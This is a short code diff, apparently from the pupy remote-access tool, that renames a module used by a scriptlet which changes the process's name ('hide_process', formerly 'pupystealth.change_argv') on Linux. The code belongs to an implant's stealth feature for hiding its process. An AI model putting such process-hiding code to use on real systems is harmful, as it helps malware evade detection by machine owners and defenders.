@@ -9,7 +9,7 @@ class ScriptletGenerator(Scriptlet):
     """ change pupy process's name """
 
     dependencies = {
-        'linux': ['pupystealth.change_argv']
+        'linux': ['hide_process']
     }
 
     arguments = {
@@ -23,6 +23,6 @@ class ScriptletGenerator(Scriptlet):
         return textwrap.dedent("""
         import sys
         if sys.platform=="linux2":
-            import pupystealth.change_argv
-            pupystealth.change_argv.change_argv(argv={})
+            import hide_process
+            hide_process.change_argv(argv={})
         """.format(repr(self.name)))
